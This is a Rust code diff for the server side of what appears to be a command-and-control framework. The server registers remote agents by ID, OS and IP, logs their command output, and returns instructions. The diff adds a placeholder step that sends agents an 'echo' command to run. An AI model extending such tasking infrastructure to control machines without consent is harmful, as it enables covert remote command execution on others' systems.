@@ -1,4 +1,3 @@
-use rocket::form::validate::Len;
 use serde::Serialize;
 use std::{net::SocketAddr, time::SystemTime};
 use talaria::{
@@ -9,65 +8,49 @@ use crate::SharedState;
 
 #[derive(Serialize, Clone, Debug)]
 pub struct Agent {
-    nickname: Option<String>,
-    id: u64,
-    os: Option<String>,
-    ip: SocketAddr,
-    // time of last response as indicated by agent
-    last_response_send: u64,
-    // time of last response as indicated by server
-    last_response_recv: u64,
-    instruction_history: Vec<AgentInstruction>,
-    response_history: Vec<AgentResponse>,
+    pub nickname: Option<String>,
+    pub id: u64,
+    pub os: Option<String>,
+    pub ip: SocketAddr,
+    pub last_response_send: u64,
+    pub last_response_recv: u64,
+    pub instruction_history: Vec<AgentInstruction>,
+    pub response_history: Vec<AgentResponse>,
 }
 
+// Register or update agent in the state
 async fn register_or_update(
     state: &rocket::State<SharedState>,
     response: &AgentResponse,
     instruction: &AgentInstruction,
     addr: SocketAddr,
 ) {
-    let agents = state.read().await.agents.clone();
-    let header = response.packet_header.clone();
-
-    // update agent if found
-    for i in 0..agents.len() {
-        if agents[i].id == header.agent_id {
-            log::info!(
-                "Heartbeat received from Agent {} at {:?}",
-                header.agent_id,
-                addr,
-            );
-
-            state.write().await.agents[i].last_response_send = header.timestamp;
-            state.write().await.agents[i].last_response_recv = time();
-
-            state.write().await.agents[i]
-                .response_history
-                .push(response.clone());
-
-            state.write().await.agents[i]
-                .instruction_history
-                .push(instruction.clone());
-
+    let mut agents = state.write().await;
+    for agent in agents.agents.iter_mut() {
+        if agent.id == response.packet_header.agent_id {
+            log::info!("Updated Agent {} at {:?}", agent.id, addr);
+            agent.last_response_send = response.packet_header.timestamp;
+            agent.last_response_recv = current_time();
+            agent.response_history.push(response.clone());
+            agent.instruction_history.push(instruction.clone());
             return;
         }
     }
 
-    // else add new agent
-    let agent = Agent {
+    // Add new agent if not found
+    agents.agents.push(Agent {
         nickname: None,
-        id: header.agent_id,
-        os: header.os,
+        id: response.packet_header.agent_id,
+        os: response.packet_header.os.clone(),
         ip: addr,
-        last_response_send: header.timestamp,
-        last_response_recv: time(),
-        instruction_history: vec![],
-        response_history: vec![],
-    };
-    state.write().await.agents.push(agent);
+        last_response_send: response.packet_header.timestamp,
+        last_response_recv: current_time(),
+        instruction_history: vec![instruction.clone()],
+        response_history: vec![response.clone()],
+    });
 }
 
+// Route to handle agent responses and issue instructions
 #[post("/monolith", data = "<input>")]
 pub async fn monolith(
     state: &rocket::State<SharedState>,
@@ -75,31 +58,46 @@ pub async fn monolith(
     input: Vec<u8>,
 ) -> Vec<u8> {
     let response = AgentResponse::deserialize(&input);
-
-    let packet_header = response.packet_header.clone();
     let packet_body = response.packet_body.clone();
 
+    // Generate an instruction based on the received response
     let instruction = match packet_body {
-        _ => {
-            println!("{:#?}", response);
-
+        AgentResponseBody::CommandResult { stdout, stderr } => {
+            log::info!("Command Output:\nstdout: {}\nstderr: {}", stdout, stderr);
             AgentInstruction {
                 packet_header: PacketHeader {
                     agent_id: response.packet_header.agent_id,
-                    timestamp: time(),
+                    timestamp: current_time(),
                     packet_id: response.packet_header.packet_id,
                     os: None,
                 },
                 instruction: AgentInstructionBody::Ok,
             }
         }
+        _ => AgentInstruction {
+            packet_header: PacketHeader {
+                agent_id: response.packet_header.agent_id,
+                timestamp: current_time(),
+                packet_id: response.packet_header.packet_id,
+                os: None,
+            },
+            instruction: AgentInstructionBody::Command {
+                command_id: 1, // Example command_id; replace with logic for unique IDs
+                command: "echo".into(),
+                args: vec!["Hello from server!".into()],
+            },
+        },
     };
 
+    // Update agent state
     register_or_update(state, &response, &instruction, remote_addr).await;
-    return AgentInstruction::serialize(&instruction);
+
+    // Send instruction back to agent
+    AgentInstruction::serialize(&instruction)
 }
 
-fn time() -> u64 {
+// Helper to get current time in seconds since UNIX epoch
+fn current_time() -> u64 {
     SystemTime::now()
         .duration_since(SystemTime::UNIX_EPOCH)
         .unwrap()
